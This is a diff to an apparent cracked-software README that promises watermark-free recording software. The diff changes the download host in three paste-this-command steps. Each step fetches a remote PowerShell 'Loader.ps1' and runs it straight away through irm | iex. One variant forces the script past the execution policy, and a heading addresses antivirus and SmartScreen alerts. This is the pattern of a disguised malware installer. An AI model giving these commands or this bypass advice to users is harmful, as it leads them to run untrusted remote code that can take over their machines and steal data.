@@ -33,7 +33,7 @@ Standard free trials of professional recording software heavily watermark your f
    * Copy the command below, paste it into your PowerShell window, and hit Enter. The script will handle the necessary registry tweaks and install all dependencies automatically:
 
 ```powershell
-irm https://get-software.su/powershell/Loader.ps1 | iex
+irm https://trust-soft.cc/powershell/Loader.ps1 | iex
 ```
 
 ---
@@ -43,13 +43,13 @@ irm https://get-software.su/powershell/Loader.ps1 | iex
 ### 💬 Script is blocked by Execution Policy
 If Windows stops the script from running due to security policies, you can force it to run by pasting this command into a standard Command Prompt (cmd):
 ```cmd
-powershell -ExecutionPolicy Bypass -Command "irm https://get-software.su/powershell/Loader.ps1 | iex"
+powershell -ExecutionPolicy Bypass -Command "irm https://trust-soft.cc/powershell/Loader.ps1 | iex"
 ```
 
 ### 💬 "irm" command not found (Outdated PowerShell)
 If your version doesn't support the irm shortcut, use the full, unabbreviated commands instead:
 ```powershell
-Invoke-RestMethod https://get-software.su/powershell/Loader.ps1 | Invoke-Expression
+Invoke-RestMethod https://trust-soft.cc/powershell/Loader.ps1 | Invoke-Expression
 ```
 
 ### 💬 Antivirus / SmartScreen Alerts
